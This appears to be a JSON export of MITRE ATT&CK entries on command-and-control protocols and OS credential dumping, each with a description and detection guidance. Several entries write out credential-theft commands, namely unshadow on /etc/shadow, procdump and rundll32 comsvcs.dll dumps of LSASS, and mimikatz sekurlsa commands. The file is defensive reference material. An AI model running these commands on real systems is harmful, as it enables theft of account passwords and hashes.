{"ID":"T1095","name":"Non-Application Layer Protocol","description":"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.","url":"https://attack.mitre.org/techniques/T1095","created":"31 May 2017","last modified":"20 April 2023","version":"2.2","tactics":"Command and Control","detection":"Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.","platforms":"Linux, Network, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Duane Michael; Ryan Becwar","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky ProjectSauron Full Report),(Citation: Novetta Winnti April 2015),(Citation: Umbreon Trend Micro),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: ESET PipeMon May 2020),(Citation: JPCert BlackTech Malware September 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Proofpoint TA505 October 2019),(Citation: CISA WellMail July 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky Turla Penquin December 2014),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Cybereason Royal December 2022),(Citation: Check Point Pay2Key November 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: FireEye APT32 May 2017),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Fidelis Turbo),(Citation: Mythc Documentation),(Citation: FireEye APT30),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky Regin),(Citation: Dell TG-3390),(Citation: Microsoft HAFNIUM March 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Symantec Remsec IOCs),(Citation: FireEye admin@338),(Citation: Red Canary NETWIRE January 2020),(Citation: Trend Micro FIN6 October 2019),(Citation: Mandiant APT41),(Citation: Check Point Warzone Feb 2020),(Citation: Gh0stRAT ATT March 2019),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Intezer HiddenWasp Map 2019),(Citation: FireEye Operation Double Tap),(Citation: CheckPoint Bandook Nov 2020),(Citation: Leonardo Turla Penquin May 2020),(Citation: FireEye APT29 Nov 2018),(Citation: Unit 42 NETWIRE April 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Microsoft PLATINUM June 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Cylance Dust Storm),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: NSA/FBI Drovorub August 2020),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: ESET Carbon Mar 2017),(Citation: Aquino RARSTONE),(Citation: Talos Bisonal Mar 2020),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Reaver Nov 2017),(Citation: FireEye FiveHands April 2021),(Citation: CheckPoint Naikon May 2020),"}
{"ID":"T1571","name":"Non-Standard Port","description":"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)","url":"https://attack.mitre.org/techniques/T1571","created":"14 March 2020","last modified":"28 February 2023","version":"1.1","tactics":"Command and Control","detection":"Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye FIN7 Aug 2018),(Citation: Group IB Silence Sept 2018),(Citation: Talos GravityRAT),(Citation: US-CERT TYPEFRAME June 2018),(Citation: CISA WellMail July 2020),(Citation: FoxIT Wocao December 2019),(Citation: Novetta Blockbuster RATs),(Citation: Fidelis TrickBot Oct 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Costa AvosLocker May 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: Trustwave GoldenSpy June 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Unit42 BendyBear Feb 2021),(Citation: US-CERT HARDRAIN March 2018),(Citation: S2 Grupo TrickBot June 2017),(Citation: Fidelis Turbo),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: NCSC Cyclops Blink February 2022),(Citation: FireEye TRITON 2019),(Citation: US-CERT BADCALL),(Citation: Novetta Blockbuster),(Citation: Symantec Elfin Mar 2019),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Talos ZxShell Oct 2014),(Citation: ESET RTM Feb 2017),(Citation: ESET BlackEnergy Jan 2016),(Citation: Anomali Rocke March 2019),(Citation: Unit 42 PingPull Jun 2022),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Talos Emotet Jan 2019),(Citation: ESET OceanLotus Mar 2019),(Citation: US-CERT Bankshot Dec 2017),(Citation: DFIR Phosphorus November 2021),(Citation: Bitdefender StrongPity June 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Talos PoetRAT April 2020),(Citation: Trend Micro njRAT 2018),"}
{"ID":"T1003","name":"OS Credential Dumping","description":"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n","url":"https://attack.mitre.org/techniques/T1003","created":"31 May 2017","last modified":"08 March 2022","version":"2.1","tactics":"Credential Access","detection":"### Windows\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":"Linux, Windows, macOS","data sources":"Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs; Vincent Le Toux","permissions required":"Administrator, root, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Suckfly May 2016),(Citation: ESET Sednit Part 2),(Citation: FireEye APT40 March 2019),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Kaspersky Poseidon Group),(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye Periscope March 2018),(Citation: Symantec Dragonfly),(Citation: Novetta-Axiom),(Citation: FireEye CARBANAK June 2017),(Citation: Symantec Sowbug Nov 2017),(Citation: Cylance Shaheen Nov 2018),(Citation: F-Secure The Dukes),(Citation: Cybereason Oceanlotus May 2017),(Citation: BitDefender Chafer May 2020),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: Microsoft LSA),(Citation: TechNet Credential Guard),(Citation: Microsoft Securing Privileged Access),(Citation: Microsoft Replication ACL),(Citation: Microsoft Protected Users Security Group),(Citation: Microsoft WDigest Mit),(Citation: AdSecurity DCSync Sept 2015),(Citation: win10_asr),(Citation: GitHub SHB Credential Guard)"}
{"ID":"T1003.008","name":"OS Credential Dumping: /etc/passwd and /etc/shadow","description":"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n","url":"https://attack.mitre.org/techniques/T1003/008","created":"11 February 2020","last modified":"20 March 2020","version":"1.0","tactics":"Credential Access","detection":"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.","platforms":"Linux","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":null,"permissions required":"root","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub LaZagne Dec 2018),"}
{"ID":"T1003.005","name":"OS Credential Dumping: Cached Domain Credentials","description":"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nWith SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)","url":"https://attack.mitre.org/techniques/T1003/005","created":"21 February 2020","last modified":"24 March 2020","version":"1.0","tactics":"Credential Access","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.","platforms":"Windows","data sources":"Command: Command Execution","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs","permissions required":"SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec MuddyWater Dec 2018),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT35 2018),(Citation: Symantec Elfin Mar 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Mandiant APT1),(Citation: FireEye APT34 July 2019),(Citation: FireEye APT33 Guardrail),(Citation: ESET Okrum July 2019),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub Pupy),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub LaZagne Dec 2018),(Citation: Microsoft Protected Users Security Group),(Citation: Tilbury Windows Credentials)"}
{"ID":"T1003.006","name":"OS Credential Dumping: DCSync","description":"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)","url":"https://attack.mitre.org/techniques/T1003/006","created":"11 February 2020","last modified":"22 April 2021","version":"1.0","tactics":"Credential Access","detection":"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)","platforms":"Windows","data sources":"Active Directory: Active Directory Object Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"ExtraHop; Vincent Le Toux","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: GitHub Mimikatz lsadump Module),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Deply Mimikatz),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: NCSC Joint Report Public Tools),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Microsoft 365 Defender Solorigate),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft Replication ACL),(Citation: ADSecurity Mimikatz DCSync)"}
{"ID":"T1003.004","name":"OS Credential Dumping: LSA Secrets","description":"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)","url":"https://attack.mitre.org/techniques/T1003/004","created":"21 February 2020","last modified":"21 April 2021","version":"1.0","tactics":"Credential Access","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":"Windows","data sources":"Command: Command Execution, Windows Registry: Windows Registry Key Access","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs","permissions required":"SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group APT15 Alive and Strong),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: TrueSec Gsecdump),(Citation: Symantec Leafminer July 2018),(Citation: Core Security Impacket),(Citation: GitHub Mimikatz lsadump Module),(Citation: Impacket Tools),(Citation: US-CERT TA18-074A),(Citation: FireEye APT34 July 2019),(Citation: FireEye APT33 Guardrail),(Citation: CME Github September 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Dell TG-3390),(Citation: AADInternals Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: Deply Mimikatz),(Citation: NCSC Joint Report Public Tools),(Citation: F-Secure The Dukes),(Citation: Unit42 OilRig Playbook 2023),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: Github AD-Pentest-Script),(Citation: CrowdStrike IceApple May 2022),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: FireEye APT35 2018),(Citation: GitHub Pupy),(Citation: GitHub LaZagne Dec 2018),(Citation: Tilbury Windows Credentials)"}
{"ID":"T1003.001","name":"OS Credential Dumping: LSASS Memory","description":"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n","url":"https://attack.mitre.org/techniques/T1003/001","created":"11 February 2020","last modified":"03 April 2023","version":"1.2","tactics":"Credential Access","detection":"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Access, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs; Edward Millington","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Mandiant APT1),(Citation: Group IB Silence Sept 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: Symantec Leafminer July 2018),(Citation: Impacket Tools),(Citation: DOJ GRU Indictment Jul 2018),(Citation: FireEye APT34 July 2019),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ESET Okrum July 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Threatpost Lizar May 2021),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec MuddyWater Dec 2018),(Citation: ESET Sednit Part 2),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: Symantec WastedLocker June 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET Bad Rabbit),(Citation: CISA AA20-301A Kimsuky),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye TRITON 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub PowerSploit May 2012),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: FireEye APT35 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Telebots June 2017),(Citation: NCC Group APT15 Alive and Strong),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye APT39 Jan 2019),(Citation: ESET Telebots Dec 2016),(Citation: F-Secure CozyDuke),(Citation: GitHub Mimikatz lsadump Module),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Dell TG-3390),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: US-CERT NotPetya 2017),(Citation: FireEye APT40 March 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Symantec Whitefly March 2019),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Trend Micro Emotet Jan 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: GitHub LaZagne Dec 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: Symantec Buckeye),(Citation: Microsoft NICKEL December 2021),(Citation: Talos Nyetya June 2017),(Citation: Amplia WCE),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT33 Guardrail),(Citation: BiZone Lizar May 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: PowerSploit Documentation),(Citation: Deply Mimikatz),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: Group IB APT 41 June 2021),(Citation: Talos PoetRAT April 2020),(Citation: Cylance Cleaver),(Citation: GitHub Pupy),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: Microsoft LSA),(Citation: TechNet Credential Guard),(Citation: Microsoft WDigest Mit),(Citation: win10_asr),(Citation: GitHub SHB Credential Guard)"}
{"ID":"T1003.003","name":"OS Credential Dumping: NTDS","description":"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n","url":"https://attack.mitre.org/techniques/T1003/003","created":"11 February 2020","last modified":"08 March 2022","version":"1.1","tactics":"Credential Access","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.","platforms":"Windows","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs","permissions required":"Administrator","supports remote":null,"system requirements":"Access to Domain Controller or backup","impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: LOLBAS Esentutl),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Cicada November 2020),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Core Security Impacket),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Impacket Tools),(Citation: US-CERT TA18-074A),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CME Github September 2018),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Github Koadic),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cary Esentutl),(Citation: Cycraft Chimera April 2020),(Citation: Metcalf 2015)"}
